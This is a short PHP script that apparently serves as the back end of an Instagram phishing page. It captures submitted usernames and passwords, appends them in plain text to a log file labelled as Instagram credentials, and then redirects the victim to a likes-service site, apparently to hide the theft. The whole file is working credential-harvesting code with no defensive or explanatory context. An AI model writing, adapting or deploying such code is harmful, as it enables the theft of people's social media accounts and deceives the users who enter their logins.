<?php

file_put_contents("userlog.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://ezlikers.com/');
exit();
                             
